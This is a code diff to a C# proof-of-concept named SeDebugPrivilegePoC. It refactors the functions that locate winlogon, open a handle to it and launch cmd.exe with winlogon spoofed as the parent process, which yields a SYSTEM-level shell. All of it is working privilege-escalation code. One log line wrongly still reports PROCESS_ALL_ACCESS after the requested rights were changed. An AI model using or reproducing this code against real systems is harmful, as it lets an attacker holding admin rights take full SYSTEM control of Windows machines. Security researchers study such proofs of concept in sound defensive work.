@@ -181,22 +181,25 @@ namespace SeDebugPrivilegePoC
         /*
          * User defined functions
          */
+        static bool CompareIgnoreCase(string strA, string strB)
+        {
+            return (string.Compare(strA, strB, StringComparison.OrdinalIgnoreCase) == 0);
+        }
+
+
         static bool CreateProcessFromHandle(IntPtr hProcess)
         {
             int error;
             bool status;
+            int size = 0;
+            var lpValue = IntPtr.Zero;
             var si = new STARTUPINFOEX();
             si.StartupInfo.cb = Marshal.SizeOf(si);
             si.lpAttributeList = IntPtr.Zero;
-            int size = 0;
 
             do
             {
-                status = InitializeProcThreadAttributeList(
-                    si.lpAttributeList,
-                    1,
-                    0,
-                    ref size);
+                status = InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, ref size);
                 error = Marshal.GetLastWin32Error();
 
                 if (!status)
@@ -209,69 +212,70 @@ namespace SeDebugPrivilegePoC
                 }
             } while (!status && error == ERROR_INSUFFICIENT_BUFFER);
 
-            if (!status)
+            do
             {
-                if (si.lpAttributeList != IntPtr.Zero)
-                    Marshal.FreeHGlobal(si.lpAttributeList);
+                if (!status)
+                {
+                    Console.WriteLine("[-] Failed to initialize thread attribute list.");
+                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+                    break;
+                }
 
-                Console.WriteLine("[-] Failed to initialize thread attribute list.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
+                Marshal.WriteIntPtr(lpValue, hProcess);
 
-                return false;
-            }
+                status = UpdateProcThreadAttribute(
+                    si.lpAttributeList,
+                    0,
+                    (IntPtr)PROC_THREAD_ATTRIBUTES.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                    lpValue,
+                    (IntPtr)IntPtr.Size,
+                    IntPtr.Zero,
+                    IntPtr.Zero);
 
-            IntPtr lpValue = Marshal.AllocHGlobal(IntPtr.Size);
-            Marshal.WriteIntPtr(lpValue, hProcess);
+                if (!status)
+                {
+                    error = Marshal.GetLastWin32Error();
+                    Console.WriteLine("[-] Failed to update thread attribute.");
+                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+                    break;
+                }
 
-            if (!UpdateProcThreadAttribute(
-                si.lpAttributeList,
-                0,
-                (IntPtr)PROC_THREAD_ATTRIBUTES.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
-                lpValue,
-                (IntPtr)IntPtr.Size,
-                IntPtr.Zero,
-                IntPtr.Zero))
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to update thread attribute.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+                status = CreateProcess(
+                    null,
+                    @"C:\Windows\System32\cmd.exe",
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    false,
+                    ProcessCreationFlags.EXTENDED_STARTUPINFO_PRESENT | ProcessCreationFlags.CREATE_NEW_CONSOLE,
+                    IntPtr.Zero,
+                    Environment.CurrentDirectory,
+                    ref si,
+                    out PROCESS_INFORMATION pi);
+
+                if (!status)
+                {
+                    error = Marshal.GetLastWin32Error();
+                    Console.WriteLine("[-] Failed to create new process.");
+                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+                }
+                else
+                {
+                    Console.WriteLine("[+] New process is created successfully.");
+                    Console.WriteLine("    |-> PID : {0}", pi.dwProcessId);
+                    Console.WriteLine("    |-> TID : {0}", pi.dwThreadId);
+                    CloseHandle(pi.hThread);
+                    CloseHandle(pi.hProcess);
+                }
+            } while (false);
+
+            if (lpValue != IntPtr.Zero)
                 Marshal.FreeHGlobal(lpValue);
+
+            if (si.lpAttributeList != IntPtr.Zero)
                 Marshal.FreeHGlobal(si.lpAttributeList);
 
-                return false;
-            }
-
-            Marshal.FreeHGlobal(lpValue);
-
-            if (!CreateProcess(
-                null,
-                "C:\\Windows\\System32\\cmd.exe",
-                IntPtr.Zero,
-                IntPtr.Zero,
-                false,
-                ProcessCreationFlags.EXTENDED_STARTUPINFO_PRESENT | ProcessCreationFlags.CREATE_NEW_CONSOLE,
-                IntPtr.Zero,
-                Environment.CurrentDirectory,
-                ref si,
-                out PROCESS_INFORMATION pi))
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to create new process.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
-                Marshal.FreeHGlobal(si.lpAttributeList);
-
-                return false;
-            }
-
-            Console.WriteLine("[+] New process is created successfully.");
-            Console.WriteLine("    |-> PID : {0}", pi.dwProcessId);
-            Console.WriteLine("    |-> TID : {0}", pi.dwThreadId);
-
-            CloseHandle(pi.hThread);
-            CloseHandle(pi.hProcess);
-            Marshal.FreeHGlobal(si.lpAttributeList);
-
-            return true;
+            return status;
         }
 
 
@@ -290,18 +294,14 @@ namespace SeDebugPrivilegePoC
 
                 foreach (ProcessModule mod in modules)
                 {
-                    if (string.Compare(
-                        Path.GetFileName(mod.FileName),
-                        "ntdll.dll",
-                        StringComparison.OrdinalIgnoreCase) == 0)
+                    if (CompareIgnoreCase(Path.GetFileName(mod.FileName), "ntdll.dll"))
                     {
                         pNtdll = mod.BaseAddress;
                         break;
                     }
                 }
 
-                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE |
-                    FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
+                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE | FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
             }
             else
             {
@@ -318,16 +318,9 @@ namespace SeDebugPrivilegePoC
                 IntPtr.Zero);
 
             if (nReturnedLength == 0)
-            {
                 return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
-            }
             else
-            {
-                return string.Format(
-                    "[ERROR] Code 0x{0} : {1}",
-                    code.ToString("X8"),
-                    message.ToString().Trim());
-            }
+                return string.Format("[ERROR] Code 0x{0} : {1}", code.ToString("X8"), message.ToString().Trim());
         }
 
 
@@ -335,38 +328,39 @@ namespace SeDebugPrivilegePoC
         {
             int winlogon;
             int error;
+            var hWinlogon = IntPtr.Zero;
 
-            Console.WriteLine("[>] Searching winlogon PID.");
-
-            try
+            do
             {
-                winlogon = (Process.GetProcessesByName("winlogon")[0]).Id;
-            }
-            catch
-            {
-                Console.WriteLine("[-] Failed to get process ID of winlogon.");
-                return IntPtr.Zero;
-            }
+                Console.WriteLine("[>] Searching winlogon PID.");
 
-            Console.WriteLine("[+] PID of winlogon: {0}", winlogon);
-            Console.WriteLine("[>] Trying to get handle to winlogon.");
+                try
+                {
+                    winlogon = (Process.GetProcessesByName("winlogon")[0]).Id;
+                }
+                catch
+                {
+                    Console.WriteLine("[-] Failed to get process ID of winlogon.");
+                    break;
+                }
 
-            IntPtr hProcess = OpenProcess(
-                ProcessAccessFlags.PROCESS_ALL_ACCESS,
-                false,
-                winlogon);
+                Console.WriteLine("[+] PID of winlogon: {0}", winlogon);
+                Console.WriteLine("[>] Trying to get handle to winlogon.");
 
-            if (hProcess == IntPtr.Zero)
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to get a winlogon handle.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
-                return IntPtr.Zero;
-            }
+                hWinlogon = OpenProcess(ProcessAccessFlags.PROCESS_CREATE_PROCESS, false, winlogon);
 
-            Console.WriteLine("[+] Got handle to winlogon with PROCESS_ALL_ACCESS (hProcess = 0x{0}).", hProcess.ToString("X"));
+                if (hWinlogon == IntPtr.Zero)
+                {
+                    error = Marshal.GetLastWin32Error();
+                    Console.WriteLine("[-] Failed to get a winlogon handle.");
+                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+                    break;
+                }
 
-            return hProcess;
+                Console.WriteLine("[+] Got handle to winlogon with PROCESS_ALL_ACCESS (hProcess = 0x{0}).", hWinlogon.ToString("X"));
+            } while (false);
+
+            return hWinlogon;
         }
 
 
